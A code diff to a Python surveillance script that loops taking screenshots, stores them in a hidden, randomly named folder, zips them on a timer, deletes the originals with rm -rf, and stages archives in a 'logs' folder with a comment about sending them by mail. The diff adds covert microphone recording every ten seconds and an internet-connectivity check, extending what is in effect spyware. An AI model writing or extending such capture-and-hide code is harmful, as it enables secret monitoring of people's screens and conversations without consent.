@@ -1,7 +1,6 @@
 import pyscreenshot as imagegrab
 import time
 import platform
-from zipfile import ZipFile
 import os
 import random
 import string
@@ -9,6 +8,9 @@ import threading
 import smtplib
 import subprocess
 import py7zr
+import requests
+import sounddevice as sd
+from scipy.io.wavfile import write
 
 images = []
 
@@ -23,6 +25,11 @@ def os_type():
     """
     return platform.system()
 
+def check_internet_con():
+    response  = requests.get("https://www.google.com")
+    if response.status_code == 200:
+        return True
+    return False
 
 def image_paths(directory):
     """
@@ -62,6 +69,19 @@ def random_word(length):
 folder_name = "." + random_word(5) + '/' #folder
 subprocess.run(['mkdir', folder_name])
 
+
+def record_pc_audio():
+    """
+    This code is kinda crap for now, but it works, records audio
+    IMPORTANT: the recording seconds must be less than the report thread seconds
+    """
+    global folder_name
+    audio_file = random_word(5) + ".wav"
+    fs = 44100  # Sample rate
+    myrecording = sd.rec(int(9 * fs), samplerate=fs, channels=2)
+    sd.wait()  # Wait until recording is finished
+    write(folder_name + audio_file, fs, myrecording) # Save as WAV file
+
 def report():
     """
     This function will be a thread, compresses the screenshots and saves it to disk
@@ -70,10 +90,12 @@ def report():
     zipped = zip_files(folder_name)
     os.system(f"cd {folder_name} && rm -rf *")
     subprocess.run(['mv', zipped,'logs']) # send this attachment by mail
+    record_pc_audio()
     timer = threading.Timer(10, report)
     timer.start()
 
 report()
+
 i = 0
 while True:
     screenshot = imagegrab.grab()
